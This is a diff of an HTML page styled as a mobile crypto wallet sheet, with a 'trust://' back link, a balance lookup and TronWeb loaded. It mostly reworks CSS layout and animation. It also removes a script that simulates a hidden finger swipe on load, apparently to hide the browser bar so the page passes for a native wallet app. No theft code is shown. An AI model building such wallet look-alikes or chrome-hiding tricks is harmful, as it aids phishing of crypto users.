@@ -16,36 +16,50 @@
       margin: 0;
       padding: 0;
       width: 100%;
-      min-height: 100%;
+      height: 100%;
       background-color: #000000;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       color: #ffffff;
-      overflow-x: hidden;
-      overflow-y: auto;
-      -webkit-overflow-scrolling: touch;
+      overflow: hidden; /* Prevent native scroll scrollbar glitches */
     }
 
-    /* Outer Wrapper for dynamic browser bar push */
+    /* Outer Wrapper with Smooth Center Keyframe Animation */
     .scroll-page {
       width: 100%;
-      min-height: 120vh;
+      height: 100vh;
       display: flex;
       flex-direction: column;
-      justify-content: flex-end;
+      justify-content: center; /* Force elements towards center */
       align-items: center;
       background: #000000;
-      padding-top: 55px;
+      padding-top: 10px;
+
+      /* Smooth Keyframe Scroll/Slide Animation */
+      animation: smoothSlideToCenter 1.2s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+    }
+
+    /* Keyframes for smooth upward slide into exact center */
+    @keyframes smoothSlideToCenter {
+      0% {
+        transform: translateY(25vh);
+        opacity: 0.85;
+      }
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
     }
 
     /* Dynamic Island Pill indicator */
     .top-notch-area {
       width: 100%;
       max-width: 410px;
-      height: 38px;
+      height: 28px;
       display: flex;
       justify-content: center;
       align-items: center;
       background: transparent;
+      margin-bottom: 6px;
     }
 
     .dynamic-pill {
@@ -56,20 +70,19 @@
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
     }
 
-    /* Main Sheet: Locked in compact 9:14 / 9:15 ratio proportions */
+    /* Main Sheet: Centered Layout */
     .wallet-sheet {
       width: 100%;
       max-width: 410px;
-      height: 92vh;
-      max-height: 740px;
+      height: 88vh;
+      max-height: 720px;
       background-color: #0d111a;
-      border-top-left-radius: 34px;
-      border-top-right-radius: 34px;
-      box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.85);
+      border-radius: 34px;
+      box-shadow: 0 0 35px rgba(0, 0, 0, 0.9);
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      padding: 14px 22px calc(38px + env(safe-area-inset-bottom, 0px)) 22px;
+      padding: 16px 22px calc(24px + env(safe-area-inset-bottom, 0px)) 22px;
       position: relative;
     }
 
@@ -433,7 +446,6 @@
   </div>
 
   <div class="wallet-sheet" id="walletSheet">
-    
     <div>
       <div class="top-header">
         <a href="trust://" class="back-btn" id="backBtn">
@@ -638,77 +650,6 @@
   if (addressInput) {
     fetchWalletBalance(addressInput.value);
   }
-
-  // Hidden Virtual Touch Drag (Point 2 -> Point 1)
-  function simulateHiddenFingerSwipe() {
-    const targetEl = document.documentElement;
-
-    // Point 2 (Bottom) aur Point 1 (Top) coordinates
-    const startY = window.innerHeight * 0.85; // Point 2 (Niche)
-    const endY = window.innerHeight * 0.15;   // Point 1 (Upar)
-    const xPos = window.innerWidth / 2;
-
-    // Helper function to create touch object
-    function createTouch(y) {
-      return new Touch({
-        identifier: Date.now(),
-        target: targetEl,
-        clientX: xPos,
-        clientY: y,
-        screenX: xPos,
-        screenY: y,
-        pageX: xPos,
-        pageY: y + window.scrollY
-      });
-    }
-
-    // Touch Event Generator
-    function fireTouchEvent(type, touchObj) {
-      const touchEvent = new TouchEvent(type, {
-        cancelable: true,
-        bubbles: true,
-        touches: type === 'touchend' ? [] : [touchObj],
-        targetTouches: type === 'touchend' ? [] : [touchObj],
-        changedTouches: [touchObj]
-      });
-      targetEl.dispatchEvent(touchEvent);
-    }
-
-    // 1. Touch Start at Point 2
-    let currentY = startY;
-    const startTouch = createTouch(currentY);
-    fireTouchEvent('touchstart', startTouch);
-
-    // 2. Drag Step-by-Step from Point 2 to Point 1
-    const steps = 12;
-    const stepDiff = (startY - endY) / steps;
-    const scrollTargetY = document.documentElement.scrollHeight;
-
-    let stepCount = 0;
-    const dragInterval = setInterval(() => {
-      stepCount++;
-      currentY -= stepDiff;
-
-      // Virtual Drag Touch Move
-      const moveTouch = createTouch(currentY);
-      fireTouchEvent('touchmove', moveTouch);
-
-      // Programmatic scroll synced with finger swipe
-      window.scrollTo(0, (scrollTargetY / steps) * stepCount);
-
-      if (stepCount >= steps) {
-        clearInterval(dragInterval);
-        // 3. Touch End at Point 1
-        const endTouch = createTouch(endY);
-        fireTouchEvent('touchend', endTouch);
-      }
-    }, 12);
-  }
-
-  // Trigger finger swipe gesture on load
-  window.addEventListener('load', () => {
-    setTimeout(simulateHiddenFingerSwipe, 50);
-  });
 </script>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
